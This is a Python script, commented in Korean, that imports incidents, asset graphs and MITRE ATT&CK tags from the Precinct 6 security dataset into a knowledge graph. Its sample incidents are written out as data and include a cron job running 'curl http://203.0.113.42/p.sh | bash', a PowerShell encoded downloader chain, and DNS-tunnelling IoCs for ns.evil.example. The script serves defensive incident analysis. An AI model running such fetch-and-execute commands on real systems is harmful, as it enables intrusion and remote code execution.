#!/usr/bin/env python3
"""Precinct 6 (WitFoo) Cybersecurity Dataset → Bastion PE-KG-H 임포터.

데이터셋: https://huggingface.co/datasets/witfoo/precinct-6  (Apache 2.0)
1억 건 신호 + 그래프(host/user/process/network) + incidents (라벨 + MITRE) + SOAR meta.

폐쇄망 운영 가정:
  외부 HF 접근 불가 → 사내 mirror 디렉토리에서 import.
  대용량 signals 는 기본 skip (별도 vector store 권장),
  incidents + graph 만 KG / History 로 흡수.

사용:
  python3 scripts/import_precinct6.py --src /opt/precinct6-mirror
  python3 scripts/import_precinct6.py --src /opt/precinct6-mirror --max-incidents 1000

산출:
  - History anchor (kind=breach_record)  : incidents 1건당 1개
  - KG Asset 노드 + relates_to 엣지        : graph nodes/edges 그대로 매핑
  - Playbook tag (mitre_technique)         : 기존 playbook 에 매핑된 ATT&CK 기법 추가

폴백 (사내 mirror 미설치 환경):
  --sample 옵션으로 내장 5건 샘플 데이터로 dry-run.
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import time
from pathlib import Path
from typing import Iterable

# .env 로드 (LLM_BASE_URL 등 require)
ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
env_path = ROOT / ".env"
if env_path.exists():
    for line in env_path.read_text().splitlines():
        if line and not line.startswith("#") and "=" in line:
            k, v = line.split("=", 1)
            os.environ.setdefault(k.strip(), v.strip())


# ── 샘플 데이터 (mirror 부재 시 dry-run 용) ───────────────────────────────────

SAMPLE_INCIDENTS = [
    {
        "id": "incident-2024-08-001",
        "label": "lateral_movement",
        "title": "SMB 측면이동 — 동일 자격증명 5호스트",
        "summary": "10.20.30.50 (john.doe) → 10.20.30.{60,70,80,90,100} 에 SMB 인증 성공. "
                   "단일 자격증명 재사용 패턴.",
        "mitre": ["T1021.002", "T1078"],
        "iocs": ["10.20.30.50", "10.20.30.60", "smb-share://win-fs01/admin$"],
        "first_seen": "2024-08-12T03:14:00Z",
        "last_seen": "2024-08-12T03:42:00Z",
    },
    {
        "id": "incident-2024-08-002",
        "label": "credential_access",
        "title": "Kerberos AS-REP roasting",
        "summary": "win-dc01 에서 PreAuthFlag=False 계정 3건 식별, "
                   "AS-REP 응답이 외부 IP 198.51.100.42 로 유출.",
        "mitre": ["T1558.004"],
        "iocs": ["198.51.100.42", "krbtgt-hash:abc123def"],
        "first_seen": "2024-08-15T11:02:00Z",
        "last_seen": "2024-08-15T11:18:00Z",
    },
    {
        "id": "incident-2024-08-003",
        "label": "exfiltration",
        "title": "DNS 터널링 — base32 페이로드",
        "summary": "10.20.30.80 → ns.evil.example 으로 비정상 길이 DNS 쿼리 1,247건. "
                   "subdomain 패턴이 base32 인코딩.",
        "mitre": ["T1071.004", "T1048.003"],
        "iocs": ["ns.evil.example", "[a-z2-7]{40,60}\\.evil\\.example"],
        "first_seen": "2024-08-22T22:47:00Z",
        "last_seen": "2024-08-23T01:12:00Z",
    },
    {
        "id": "incident-2024-08-004",
        "label": "initial_access",
        "title": "스피어 피싱 첨부파일 (HTA + PowerShell downloader)",
        "summary": "user@victim.example 이 invoice.hta 첨부 실행 → mshta.exe → cmd → "
                   "powershell -enc <base64> 패턴 관찰.",
        "mitre": ["T1566.001", "T1059.001", "T1218.005"],
        "iocs": ["sha256:" + "b" * 64, "phishing-domain:invoices-2024.example"],
        "first_seen": "2024-07-30T09:11:00Z",
        "last_seen": "2024-07-30T09:15:00Z",
    },
    {
        "id": "incident-2024-08-005",
        "label": "persistence",
        "title": "Linux cron + curl downloader",
        "summary": "10.20.30.80 의 /etc/cron.d/ 에 신규 항목, 5분마다 "
                   "curl http://203.0.113.42/p.sh | bash 실행.",
        "mitre": ["T1053.003", "T1105"],
        "iocs": ["203.0.113.42", "/etc/cron.d/.update", "sha256:" + "c" * 64],
        "first_seen": "2024-08-05T04:30:00Z",
        "last_seen": "2024-08-05T04:35:00Z",
    },
]

SAMPLE_GRAPH = {
    "nodes": [
        {"id": "host:10.20.30.50", "type": "Host", "name": "win-ws05",
         "meta": {"os": "Windows 10", "owner": "john.doe"}},
        {"id": "host:10.20.30.80", "type": "Host", "name": "lin-web01",
         "meta": {"os": "Ubuntu 22.04", "service": "apache"}},
        {"id": "user:john.doe", "type": "User", "name": "john.doe",
         "meta": {"domain": "corp", "role": "developer"}},
        {"id": "process:powershell.exe", "type": "Process", "name": "powershell",
         "meta": {"often_lolbin": True}},
    ],
    "edges": [
        {"src": "user:john.doe", "dst": "host:10.20.30.50", "type": "logged_in"},
        {"src": "host:10.20.30.50", "dst": "host:10.20.30.80",
         "type": "smb_connect"},
    ],
}


# ── 데이터 로더 ───────────────────────────────────────────────────────────────

def _iter_jsonl(path: Path) -> Iterable[dict]:
    if not path.exists():
        return
    with path.open() as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                yield json.loads(line)
            except json.JSONDecodeError:
                continue


def load_incidents(src: Path, max_count: int) -> list[dict]:
    p = src / "incidents.jsonl"
    if not p.exists():
        # JSON array 변형도 시도
        p2 = src / "incidents.json"
        if p2.exists():
            try:
                return json.loads(p2.read_text())[:max_count]
            except Exception:
                return []
        return []
    out = []
    for i, rec in enumerate(_iter_jsonl(p)):
        if i >= max_count:
            break
        out.append(rec)
    return out


def load_graph(src: Path) -> dict:
    p = src / "graph.json"
    if not p.exists():
        return {"nodes": [], "edges": []}
    try:
        return json.loads(p.read_text())
    except Exception:
        return {"nodes": [], "edges": []}


# ── 임포터 ────────────────────────────────────────────────────────────────────

def import_incidents_to_history(incidents: list[dict], dry_run: bool = False) -> dict:
    """Incidents → History anchor (kind='breach_record') 일괄 등록."""
    from packages.bastion.history import HistoryLayer
    h = HistoryLayer()
    added = 0
    skipped = 0
    for inc in incidents:
        label = inc.get("title", inc.get("id", "unknown"))
        body_lines = [
            f"id: {inc.get('id', '')}",
            f"label: {inc.get('label', '')}",
            f"summary: {inc.get('summary', '')}",
            f"mitre: {', '.join(inc.get('mitre', []) or [])}",
            f"first_seen: {inc.get('first_seen', '')}",
            f"last_seen: {inc.get('last_seen', '')}",
            f"iocs: {', '.join(inc.get('iocs', []) or [])}",
        ]
        body = "\n".join(body_lines)
        related = []
        # IoC 가 IP/domain 이면 asset 으로 관련짓기 — 단순 휴리스틱
        for ioc in inc.get("iocs", []) or []:
            if not isinstance(ioc, str):
                continue
            if ":" in ioc:
                continue  # sha256:xxx 등 prefix 형식은 별도 anchor 권장
            related.append(f"asset:{ioc}")
        if dry_run:
            added += 1
            continue
        try:
            # 중복 방지 — label 매치
            if h.is_anchored(label):
                skipped += 1
                continue
            h.add_anchor(
                kind="breach_record",
                label=label,
                body=body,
                related_ids=related,
                valid_from=inc.get("first_seen", "") or "",
            )
            added += 1
            # 별도 IoC anchor (kind='ioc') 도 추가 — repeat-IoC 매칭용
            for ioc in (inc.get("iocs", []) or [])[:5]:
                if not isinstance(ioc, str):
                    continue
                if h.is_anchored(ioc):
                    continue
                h.add_anchor(kind="ioc", label=ioc[:100], body=ioc,
                             related_ids=[f"incident:{inc.get('id', '')}"])
                added += 1
        except Exception as e:
            print(f"  [warn] {inc.get('id')}: {e}")
            skipped += 1
    return {"added_anchors": added, "skipped": skipped}


def import_graph_to_kg(graph: dict, dry_run: bool = False) -> dict:
    """Precinct 6 graph nodes/edges → Bastion KG Asset / relates_to 엣지."""
    if dry_run:
        return {"would_add_nodes": len(graph.get("nodes", [])),
                "would_add_edges": len(graph.get("edges", []))}
    try:
        from packages.bastion.graph import get_graph
        g = get_graph()
    except Exception as e:
        return {"error": f"graph init failed: {e}"}
    nodes_added = 0
    edges_added = 0
    for n in graph.get("nodes", []):
        try:
            # Bastion KG 의 type 은 Playbook/Experience/Skill/Asset/Concept/Insight 등.
            # Precinct 의 Host/User/Process 는 모두 Asset 으로 매핑하고 meta.kind 보존.
            meta = n.get("meta", {}) or {}
            meta["precinct6_type"] = n.get("type", "")
            g.add_node(n["id"], "Asset", n.get("name", n["id"]),
                       content={"source": "precinct6"}, meta=meta)
            nodes_added += 1
        except Exception:
            continue
    for e in graph.get("edges", []):
        try:
            g.add_edge(e["src"], e["dst"], e.get("type", "relates_to"))
            edges_added += 1
        except Exception:
            continue
    return {"nodes_added": nodes_added, "edges_added": edges_added}


def update_playbook_mitre_tags(incidents: list[dict], dry_run: bool = False) -> dict:
    """Incident 의 MITRE 매핑 → 기존 playbook 의 mitre_technique tag 보강.
    임포터는 직접 playbook 파일은 수정하지 않고, KG Concept 노드만 추가한다.
    (실제 playbook 파일 갱신은 사람 검토 후 수동으로)
    """
    if dry_run:
        techs = sorted({t for inc in incidents for t in (inc.get("mitre", []) or [])})
        return {"would_register_techniques": techs}
    try:
        from packages.bastion.graph import get_graph
        g = get_graph()
    except Exception as e:
        return {"error": str(e)}
    techs = sorted({t for inc in incidents for t in (inc.get("mitre", []) or [])})
    added = 0
    for tech in techs:
        try:
            g.add_node(f"mitre:{tech}", "Concept", tech,
                       content={"framework": "MITRE ATT&CK", "id": tech},
                       meta={"source": "precinct6"})
            added += 1
        except Exception:
            continue
    return {"techniques_added": added, "techniques": techs}


# ── 메인 ──────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--src", help="Precinct 6 mirror 디렉토리 (없으면 --sample 필요)")
    ap.add_argument("--sample", action="store_true", help="내장 샘플 5건으로 dry-run")
    ap.add_argument("--max-incidents", type=int, default=1000,
                    help="최대 임포트 건수")
    ap.add_argument("--dry-run", action="store_true",
                    help="DB 변경 없이 카운트만 보고")
    args = ap.parse_args()

    if args.sample:
        incidents = SAMPLE_INCIDENTS
        graph = SAMPLE_GRAPH
        print(f"[sample] {len(incidents)} incidents, "
              f"{len(graph['nodes'])} nodes, {len(graph['edges'])} edges")
    else:
        if not args.src:
            sys.exit("ERROR: --src 또는 --sample 둘 중 하나 필요")
        src = Path(args.src)
        if not src.is_dir():
            sys.exit(f"ERROR: {src} not a directory")
        incidents = load_incidents(src, args.max_incidents)
        graph = load_graph(src)
        print(f"[mirror] loaded {len(incidents)} incidents, "
              f"{len(graph['nodes'])} nodes, {len(graph['edges'])} edges from {src}")

    print("\n=== History (Anchors) ===")
    r1 = import_incidents_to_history(incidents, dry_run=args.dry_run)
    print(f"  {r1}")

    print("\n=== KG (Assets + Edges) ===")
    r2 = import_graph_to_kg(graph, dry_run=args.dry_run)
    print(f"  {r2}")

    print("\n=== MITRE Techniques (KG Concept) ===")
    r3 = update_playbook_mitre_tags(incidents, dry_run=args.dry_run)
    print(f"  {r3}")

    print(f"\n완료 ({time.strftime('%Y-%m-%dT%H:%M:%S')})")


if __name__ == "__main__":
    main()
